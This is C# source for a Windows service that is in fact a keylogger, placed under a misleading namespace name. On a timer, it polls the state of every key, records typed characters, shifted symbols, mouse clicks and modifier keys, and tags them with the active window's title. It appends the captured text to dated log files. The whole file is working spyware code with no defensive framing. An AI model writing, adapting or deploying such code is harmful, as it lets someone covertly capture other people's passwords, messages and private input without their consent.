using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Windows.Forms;

namespace servicioPaginaNoMicrosoft
{
    public partial class Service1 : ServiceBase
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        System.Timers.Timer timerEscribir;
        System.Timers.Timer timerGuardarBoton;
        private String keyBuffer;
        private String hWndTitle;
        private String hWndTitlePast;
        public String LOG_FILE;
        private bool tglAlt = false;
        private bool tglControl = false;
        private bool tglCapslock = false;
        String carpetaGuardarTxts = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\";
        //Assembly asmPath = Assembly.GetExecutingAssembly();


        public Service1(string[] args)
        {
            InitializeComponent();
        }

        internal void TestStartupAndStop(string[] args)
        {
            this.OnStart(args);
            Console.ReadLine();
            this.OnStop();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFileOperaciones("El servicio fue iniciado a la(s) " + DateTime.Now);

            // Timer para escribir las letras apretadas en el .txt
            timerEscribir = new System.Timers.Timer();
            timerEscribir.Elapsed += new ElapsedEventHandler(TimerBufferFlush_Elapsed);
            timerEscribir.Enabled = true;
            timerEscribir.Interval = 4 * 1000;


            //Timer para guardar las letras apretadas en el buffer
            timerGuardarBoton = new System.Timers.Timer();
            timerGuardarBoton.Elapsed += new ElapsedEventHandler(timerKeyMine_Elapsed);
            timerGuardarBoton.Enabled = true;
            timerGuardarBoton.Interval = 4 * 1000;

            hWndTitle = ActiveApplTitle();
            hWndTitlePast = hWndTitle;
        }

        protected override void OnStop()
        {
            WriteToFileOperaciones("El servicio fue detenido a la(s) " + DateTime.Now);
        }

        public void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            hWndTitle = ActiveApplTitle();

            if (hWndTitle != hWndTitlePast)
            {
                /* Si el titulo de la ventana actual es diferente al anterior
                 * muestra el nombre, si no muestra directo las teclas apretadas */
                keyBuffer += "[" + hWndTitle + "]";
                hWndTitlePast = hWndTitle;
            }

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                WriteToFileBotones("Valor de i en el ForEach: " + i.ToString(), false);
                if (GetAsyncKeyState(i) == -32767) //Si el boton esta apretado
                {
                    WriteToFileBotones("Codigo de tecla recibida: " + Enum.GetName(typeof(Keys), i), false);
                    if (ControlKey)
                    {
                        if (!tglControl)
                        {
                            tglControl = true;
                            keyBuffer += "<Ctrl=On>";
                        }
                    }
                    else
                    {
                        if (tglControl)
                        {
                            tglControl = false;
                            keyBuffer += "<Ctrl=Off>";
                        }
                    }

                    if (AltKey)
                    {
                        if (!tglAlt)
                        {
                            tglAlt = true;
                            keyBuffer += "<Alt=On>";
                        }
                    }
                    else
                    {
                        if (tglAlt)
                        {
                            tglAlt = false;
                            keyBuffer += "<Alt=Off>";
                        }
                    }

                    if (CapsLock)
                    {
                        if (!tglCapslock)
                        {
                            tglCapslock = true;
                            keyBuffer += "<CapsLock=On>";
                        }
                    }
                    else
                    {
                        if (tglCapslock)
                        {
                            tglCapslock = false;
                            keyBuffer += "<CapsLock=Off>";
                        }
                    }

                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        keyBuffer += "<LMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        keyBuffer += "<RMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        keyBuffer += "<Backspace>";
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        keyBuffer += " ";
                    else if (Enum.GetName(typeof(Keys), i) == "Return")
                        keyBuffer += "<Enter>";
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        keyBuffer += "<Del>";
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        keyBuffer += "<Ins>";
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        keyBuffer += "<Home>";
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        keyBuffer += "<End>";
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        keyBuffer += "<Tab>";
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        keyBuffer += "<Page Up>";
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        keyBuffer += "<Page Down>";
                    else if (Enum.GetName(typeof(Keys), i) == "LWin" || Enum.GetName(typeof(Keys), i) == "RWin")
                        keyBuffer += "<Win>";

                    /* ********************************************** *
					 * Detect key based off ShiftKey Toggle
					 * ********************************************** */
                    if (ShiftKey)
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)i;
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "!";
                        else if (i.ToString() == "50")
                            keyBuffer += "@";
                        else if (i.ToString() == "51")
                            keyBuffer += "#";
                        else if (i.ToString() == "52")
                            keyBuffer += "$";
                        else if (i.ToString() == "53")
                            keyBuffer += "%";
                        else if (i.ToString() == "54")
                            keyBuffer += "^";
                        else if (i.ToString() == "55")
                            keyBuffer += "&";
                        else if (i.ToString() == "56")
                            keyBuffer += "*";
                        else if (i.ToString() == "57")
                            keyBuffer += "(";
                        else if (i.ToString() == "48")
                            keyBuffer += ")";
                        else if (i.ToString() == "192")
                            keyBuffer += "~";
                        else if (i.ToString() == "189")
                            keyBuffer += "_";
                        else if (i.ToString() == "187")
                            keyBuffer += "+";
                        else if (i.ToString() == "219")
                            keyBuffer += "{";
                        else if (i.ToString() == "221")
                            keyBuffer += "}";
                        else if (i.ToString() == "220")
                            keyBuffer += "|";
                        else if (i.ToString() == "186")
                            keyBuffer += ":";
                        else if (i.ToString() == "222")
                            keyBuffer += "\"";
                        else if (i.ToString() == "188")
                            keyBuffer += "<";
                        else if (i.ToString() == "190")
                            keyBuffer += ">";
                        else if (i.ToString() == "191")
                            keyBuffer += "?";
                    }
                    else
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)(i + 32);
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "1";
                        else if (i.ToString() == "50")
                            keyBuffer += "2";
                        else if (i.ToString() == "51")
                            keyBuffer += "3";
                        else if (i.ToString() == "52")
                            keyBuffer += "4";
                        else if (i.ToString() == "53")
                            keyBuffer += "5";
                        else if (i.ToString() == "54")
                            keyBuffer += "6";
                        else if (i.ToString() == "55")
                            keyBuffer += "7";
                        else if (i.ToString() == "56")
                            keyBuffer += "8";
                        else if (i.ToString() == "57")
                            keyBuffer += "9";
                        else if (i.ToString() == "48")
                            keyBuffer += "0";
                        else if (i.ToString() == "189")
                            keyBuffer += "-";
                        else if (i.ToString() == "187")
                            keyBuffer += "=";
                        else if (i.ToString() == "92")
                            keyBuffer += "`";
                        else if (i.ToString() == "219")
                            keyBuffer += "[";
                        else if (i.ToString() == "221")
                            keyBuffer += "]";
                        else if (i.ToString() == "220")
                            keyBuffer += "\\";
                        else if (i.ToString() == "186")
                            keyBuffer += ";";
                        else if (i.ToString() == "222")
                            keyBuffer += "'";
                        else if (i.ToString() == "188")
                            keyBuffer += ",";
                        else if (i.ToString() == "190")
                            keyBuffer += ".";
                        else if (i.ToString() == "191")
                            keyBuffer += "/";
                    }
                }
            }
        }

        public void TimerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            WriteToFileOperaciones("Voy a guardar las letras apretadas en el TXT a la(s) " + DateTime.Now);
            WriteToFileBotones(keyBuffer, true);
        }

        public void WriteToFileBotones(string Message, bool borrarBuffer)
        {
            if (!Directory.Exists(carpetaGuardarTxts))
            {
                Directory.CreateDirectory(carpetaGuardarTxts);
            }
            string filepath = carpetaGuardarTxts + "botones_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            StreamWriter Escritor = new StreamWriter(filepath, true);
            Escritor.WriteLine(Message);
            Escritor.Close();
            if (borrarBuffer)
            {
                keyBuffer = "";
            }
        }

        public void WriteToFileOperaciones(String Message)
        {
            if (!Directory.Exists(carpetaGuardarTxts))
            {
                Directory.CreateDirectory(carpetaGuardarTxts);
            }
            string filepath = carpetaGuardarTxts + "operaciones_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            StreamWriter Escritor = new StreamWriter(filepath, true);
            Escritor.WriteLine(Message);
            Escritor.Close();
        }

        public static string ActiveApplTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
            if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }

        #region toggles
        public static bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); }
        } // ControlKey
        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
        } // ShiftKey
        public static bool CapsLock
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000); }
        } // CapsLock
        public static bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); }
        } // AltKey
        #endregion

        #region Properties
        public System.Boolean Enabled
        {
            get
            {
                return timerGuardarBoton.Enabled && timerEscribir.Enabled;
            }
            set
            {
                timerGuardarBoton.Enabled = timerEscribir.Enabled = value;
            }
        }
        #endregion

    }
}